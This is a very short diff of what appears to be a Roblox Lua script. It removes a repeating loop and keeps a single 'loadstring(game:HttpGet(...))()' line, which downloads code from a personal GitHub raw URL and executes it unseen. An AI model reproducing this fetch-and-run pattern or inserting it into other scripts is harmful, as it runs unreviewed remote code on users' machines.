@@ -1,4 +1,1 @@
-while true do
 loadstring(game:HttpGet('https://raw.githubusercontent.com/faisal31312/elemental/refs/heads/main/emoji'))()
-wait(10)
-end
